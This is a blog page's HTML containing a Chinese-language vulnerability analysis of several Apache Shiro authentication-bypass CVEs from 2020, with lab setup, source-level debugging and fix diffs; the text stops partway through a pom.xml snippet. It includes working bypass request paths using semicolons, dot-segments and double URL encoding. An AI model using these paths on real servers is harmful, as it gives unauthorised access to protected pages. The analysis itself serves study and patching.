@@ -1,0 +1,851 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Str3am.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Str3am.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Damion:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('https://jlkl.github.io').hostname,
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.7.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="权限绕过环境搭建基于此源码：https:&#x2F;&#x2F;github.com&#x2F;l3yx&#x2F;springboot-shiro 导入idea，application.properties添加 1server.servlet.context-path&#x3D;&#x2F;test  因为pom.xml里排除了springboot内置的tomcat，新建Configurations-&gt;Tomcat Server，添加新的deplo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shiro Vulnerability">
+<meta property="og:url" content="https://jlkl.github.io/2021/06/28/Web_19/index.html">
+<meta property="og:site_name" content="Str3am&#39;s Blog">
+<meta property="og:description" content="权限绕过环境搭建基于此源码：https:&#x2F;&#x2F;github.com&#x2F;l3yx&#x2F;springboot-shiro 导入idea，application.properties添加 1server.servlet.context-path&#x3D;&#x2F;test  因为pom.xml里排除了springboot内置的tomcat，新建Configurations-&gt;Tomcat Server，添加新的deplo">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210521160542.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210616102033.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210616103709.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210616103733.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210616204020.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210616204348.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210616204918.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210616205118.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210616210233.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210617110217.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210617110602.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210617112248.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210617112929.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210617142807.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210617143202.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210617170426.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210617170506.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210617170837.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210617171414.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210622153748.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210622153912.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210622154356.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210622154521.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210622154936.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210622163002.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210622163112.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210622171227.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210622171519.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210624150142.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210624150217.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210624151018.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210624154428.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210624161828.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210624154644.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210624171323.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210624171438.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210624210041.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210624210400.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210624210544.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210624210710.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210624210743.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210624210912.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210624211104.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210624211317.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210624211521.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210628155306.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210628155430.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210628155541.png">
+<meta property="og:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210628155940.png">
+<meta property="article:published_time" content="2021-06-28T13:18:00.000Z">
+<meta property="article:modified_time" content="2021-06-28T13:25:02.717Z">
+<meta property="article:author" content="Str3am">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jlkl.github.io/2021/06/28/Web_19/20210521160542.png">
+
+<link rel="canonical" href="https://jlkl.github.io/2021/06/28/Web_19/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>Shiro Vulnerability | Str3am's Blog</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?fcdffc3f3c9531fca765ea966be04985";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Str3am's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Str3am's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags<span class="badge">15</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives<span class="badge">36</span></a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jlkl.github.io/2021/06/28/Web_19/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Str3am.jpg">
+      <meta itemprop="name" content="Str3am">
+      <meta itemprop="description" content="这个人很懒，什么也没留下">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Str3am's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Shiro Vulnerability
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-06-28 21:18:00 / Modified: 21:25:02" itemprop="dateCreated datePublished" datetime="2021-06-28T21:18:00+08:00">2021-06-28</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2021/06/28/Web_19/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/06/28/Web_19/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              <span>7.6k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              <span>10 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>基于此源码：<a href="https://github.com/l3yx/springboot-shiro" target="_blank" rel="noopener">https://github.com/l3yx/springboot-shiro</a></p>
+<p>导入idea，application.properties添加</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server.servlet.context-path</span>=/test</span><br></pre></td></tr></table></figure>
+
+<p>因为pom.xml里排除了springboot内置的tomcat，新建Configurations-&gt;Tomcat Server，添加新的deployment，并设置context为<code>/test</code>，然后运行即可</p>
+<p><img src="/2021/06/28/Web_19/20210521160542.png" alt="image-20210521160532545"></p>
+<h3 id="Shiro基础"><a href="#Shiro基础" class="headerlink" title="Shiro基础"></a>Shiro基础</h3><p>Shiro验证</p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">anon</span> <span class="string">不需要验证，可以直接访问</span></span><br><span class="line"><span class="attr">authc</span> <span class="string">需要验证，也就是我们需要bypass的地方</span></span><br></pre></td></tr></table></figure>
+
+<p>Shiro的URL路径表达式为Ant格式</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/hello 只匹配url http:/</span><span class="regexp">/demo.com/</span>hello</span><br><span class="line"><span class="regexp">/h?      只匹配url  http:/</span><span class="regexp">/demo.com/</span>h+任意一个字符</span><br><span class="line"><span class="regexp">/hello/</span>*  匹配url下 http:<span class="regexp">//</span>demo.com<span class="regexp">/hello/</span>xxxx的任意内容，不匹配多个路径</span><br><span class="line"><span class="regexp">/hello/</span>** 匹配url下 http:<span class="regexp">//</span>demo.com<span class="regexp">/hello/</span>xxxx<span class="regexp">/aaaa的任意内容，匹配多个路径</span></span><br></pre></td></tr></table></figure>
+
+<a id="more"></a>
+
+<h3 id="CVE-2020-1957"><a href="#CVE-2020-1957" class="headerlink" title="CVE-2020-1957"></a>CVE-2020-1957</h3><h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><ul>
+<li>Apache Shiro &lt; 1.5.2</li>
+</ul>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>这里需要在pom.xml里面修改shiro版本为1.5.1，而且spring-boot的版本记得改为:<code>1.5.22.RELEASE</code>，原因具体可以查看：</p>
+<p><a href="https://www.anquanke.com/post/id/240033#h3-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/240033#h3-5</a></p>
+<p>同时因为版本问题，<code>SrpingbootShiroApplication.java</code> 里这个类名需要改成如下，然后启动tomcat即可<img src="/2021/06/28/Web_19/20210616102033.png" alt="image-20210616102024338"></p>
+<p>POC：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/test/</span>a;<span class="regexp">/../</span>admin<span class="regexp">/page</span></span><br></pre></td></tr></table></figure>
+
+<p>直接访问302</p>
+<p><img src="/2021/06/28/Web_19/20210616103709.png" alt="image-20210616103708415"></p>
+<p>绕过</p>
+<p><img src="/2021/06/28/Web_19/20210616103733.png" alt="image-20210616103732111"></p>
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>这里需要前置知识<a href="https://xz.aliyun.com/t/7544" target="_blank" rel="noopener">Tomcat URL解析差异性导致的安全问题</a>，总结就是</p>
+<blockquote>
+<p>Tomcat对请求路径中<code>/;xxx/</code>以及<code>/./</code>的处理是包容的、对<code>/../</code>会进行跨目录拼接处理</p>
+</blockquote>
+<p>调试tomcat逻辑需要在pom.xml里添加依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.37<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>定位到1.5.2版本修改的文件 <code>org\apache\shiro\web\util\WebUtils.java</code>，里面getRequestUri函数调用的是request.getRequestURI处理，对于POC，此时uri和POC相同，即<code>/test/a;/../admin/page</code></p>
+<p><img src="/2021/06/28/Web_19/20210616204020.png" alt="image-20210616204018948"></p>
+<p>decodeAndCleanUriString函数则是对含有<code>;</code>的路径进行处理，直接忽略掉<code>;</code>和其之后的部分，对于POC，返回<code>/test/a</code></p>
+<p><img src="/2021/06/28/Web_19/20210616204348.png" alt="image-20210616204343806"></p>
+<p>normalize函数会对uri进行规范化处理，处理掉<code>/./</code>，<code>/../</code>，这里对POC没有什么影响</p>
+<p>return完之后进入getPathWithinApplication函数，去除掉ContextPath，对于POC返回<code>/a</code></p>
+<p><img src="/2021/06/28/Web_19/20210616204918.png" alt="image-20210616204917915"></p>
+<p>然后进入Shiro匹配逻辑，取出config中定义规则，验证是否匹配，<code>/a</code>显然不满足<code>/admin/*</code>，不需要验证</p>
+<p><img src="/2021/06/28/Web_19/20210616205118.png" alt="image-20210616205117358"></p>
+<p>Shiro验证绕过之后来到了Spring-boot解析，这个版本会调用tomcat的<code>getServletPath</code>，对<code>/;xxx/</code>以及<code>/./</code>有包容性，POC对于tomcat来说就相当于是<code>/test/admin/page</code>，于是能正常访问</p>
+<p>总结漏洞产生的原因，Shiro调用request的getRequestURI获取到请求的地址之后，使用自身编写的逻辑去处理判断，没有考虑到tomcat解析兼容的差异性</p>
+<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>diff 1.5.1 和 1.5.2 的代码，这里主要使用<code>request.getServletPath</code>来获取请求的路径，而其是tomcat内置，会考虑到对<code>/;xxx/</code>以及<code>/./</code>的包容性，那么对于POC，getServletPath返回<code>/admin/page</code>，自然通不过验证，即Shiro主动去兼容tomcat</p>
+<p><img src="/2021/06/28/Web_19/20210616210233.png" alt="image-20210616210233039"></p>
+<h3 id="CVE-2020-11989"><a href="#CVE-2020-11989" class="headerlink" title="CVE-2020-11989"></a>CVE-2020-11989</h3><h4 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h4><ul>
+<li>Apache Shiro &lt; 1.5.3</li>
+</ul>
+<h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>第一种方式：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/;/</span>test<span class="regexp">/admin/</span>page</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/28/Web_19/20210617110217.png" alt="image-20210617110209365"></p>
+<p>第二种方式：</p>
+<p>为了复现第二种方式，需要添加一个controller</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"/admin/&#123;name&#125;"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(@PathVariable String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello "</span> + name;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>POC</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test/admin/w%<span class="number">25</span>%<span class="number">32</span>%<span class="number">66</span>orld 或 /test/admin/w%<span class="number">252f</span>orld</span><br></pre></td></tr></table></figure>
+
+<p><code>%25%32%66</code> 和 <code>%252f</code>为<code>/</code> 的二次url编码</p>
+<p><img src="/2021/06/28/Web_19/20210617110602.png" alt="image-20210617110601327"></p>
+<h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p><a href="https://xz.aliyun.com/t/7964" target="_blank" rel="noopener">https://xz.aliyun.com/t/7964</a></p>
+<p><a href="https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/" target="_blank" rel="noopener">https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/</a></p>
+<p>第一种绕过方式比较通用，这里以第一种进行分析。在上一个我们提到Shiro验证是再getChain函数，获取到请求路径后，和config中配置进行对比</p>
+<p><img src="/2021/06/28/Web_19/20210617112248.png" alt="image-20210617112247406"></p>
+<p>获取请求路径是在getPathWithinApplication函数，getPathWithinApplication作用也说过，去掉请求中的ContextPath</p>
+<p><img src="/2021/06/28/Web_19/20210617112929.png" alt="image-20210617112928238"></p>
+<p>关键就在于getRequestUri函数，normalize是规范化<code>/./</code>和<code>/../</code></p>
+<p><img src="/2021/06/28/Web_19/20210617142807.png" alt="image-20210617142806155"></p>
+<p>decodeAndCleanUriString先进行一次url解码，然后注意59是<code>;</code>的ascii码，这里遇到<code>;</code>的处理逻辑是，直接忽略<code>;</code>及以后，那么对于POC1，这里获取到的路径就是<code>/</code>，可以绕过Shiro验证</p>
+<p><img src="/2021/06/28/Web_19/20210617143202.png" alt="image-20210617143200521"></p>
+<p>第二种方式主要是解码和匹配的问题，decodeAndCleanUriString还会进行一次url解码，<code>%25%32%66</code>会还原成<code>/</code>，<code>/admin/w/orld</code>不满足<code>/admin/*</code>（注意<code>/admin/*</code>只匹配一个路径，不匹配多个），所以绕过</p>
+<h4 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>getServletPath和getPathInfo使用request方法获取路径和信息，会处理掉<code>;</code>，<code>..</code>等，同时没有了二次解码</p>
+<p><img src="/2021/06/28/Web_19/20210617170426.png" alt="image-20210617170425647"></p>
+<p><img src="/2021/06/28/Web_19/20210617170506.png" alt="image-20210617170504979"></p>
+<p>xq17师傅还提到如果getPathInfo可以引入<code>;</code>，那么也是可以继续绕过的，遗憾的是我在调试的时候一直没找到getServletPath在哪一段可以引入，希望知道的师傅可以指导一下</p>
+<p>同时上个版本的修复又改回去了</p>
+<p><img src="/2021/06/28/Web_19/20210617170837.png" alt="image-20210617170836320"></p>
+<h3 id="CVE-2020-13933"><a href="#CVE-2020-13933" class="headerlink" title="CVE-2020-13933"></a>CVE-2020-13933</h3><h4 id="影响范围-2"><a href="#影响范围-2" class="headerlink" title="影响范围"></a>影响范围</h4><ul>
+<li>Apache Shiro &lt; 1.6.0</li>
+</ul>
+<h4 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>Shiro 1.5.3版本</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span>        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span>        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>POC</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test/admin/%<span class="number">3</span>bStr3am</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/28/Web_19/20210617171414.png" alt="image-20210617171413141"></p>
+<h4 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p><img src="/2021/06/28/Web_19/20210622153748.png" alt="image-20210622153740414"></p>
+<p>修复过后的getPathWithinApplication函数中getServletPath调用request.getServletPath，会进行url二次解码，POC解码为<code>/admin/%3bStr3am</code>，removeSemicolon会对<code>;</code>进行处理。POC变为<code>/admin/</code></p>
+<p><img src="/2021/06/28/Web_19/20210622153912.png" alt="image-20210622153857408"></p>
+<p>然后这段是对Shiro-682的修复，会去掉最后的<code>/</code>，显然<code>/admin</code>不满足Shiro匹配<code>/admin/*</code>，所以造成bypass</p>
+<h4 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>在<code>shiro 1.6.0</code>版本中，针对<code>/*</code>这种<code>ant</code>风格的配置出现的问题，<code>shiro</code>在<code>org.apache.shiro.spring.web.ShiroFilterFactoryBean.java</code>中默认增加了<code>/**</code>的路径配置，以防止出现匹配不成功的情况。</p>
+<p><img src="/2021/06/28/Web_19/20210622154356.png" alt="image-20210622154355823"></p>
+<p>而默认的<code>/**</code>配置对应了一个新增的类<code>org.apache.shiro.web.filter.InvalidRequestFilter</code>进行过滤，匹配到非法字符就会直接报错，可以看到，过滤了<code>%3b</code></p>
+<p><img src="/2021/06/28/Web_19/20210622154521.png" alt="image-20210622154520915"></p>
+<h3 id="CVE-2020-17510"><a href="#CVE-2020-17510" class="headerlink" title="CVE-2020-17510"></a>CVE-2020-17510</h3><h4 id="影响范围-3"><a href="#影响范围-3" class="headerlink" title="影响范围"></a>影响范围</h4><ul>
+<li>Apache Shiro &lt; 1.7.0</li>
+</ul>
+<h4 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p><img src="/2021/06/28/Web_19/20210622154936.png" alt="image-20210622154935289"></p>
+<p>增加了对PathInfo的检验，修复过后，Shiro的URL校验是由ServletPath和PathInfo构成，之前CVE-2020-11989的时候提到过可以在PathInfo加入<code>;</code>或<code>../</code>绕过，Spring-boot默认PathInfo为空，但在其他情况可以，利用范围有限。</p>
+<h3 id="CVE-2020-17523"><a href="#CVE-2020-17523" class="headerlink" title="CVE-2020-17523"></a>CVE-2020-17523</h3><h4 id="影响范围-4"><a href="#影响范围-4" class="headerlink" title="影响范围"></a>影响范围</h4><ul>
+<li>Apache Shiro &lt; 1.7.0</li>
+</ul>
+<h4 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span>        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span>        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span>    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span>         <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>            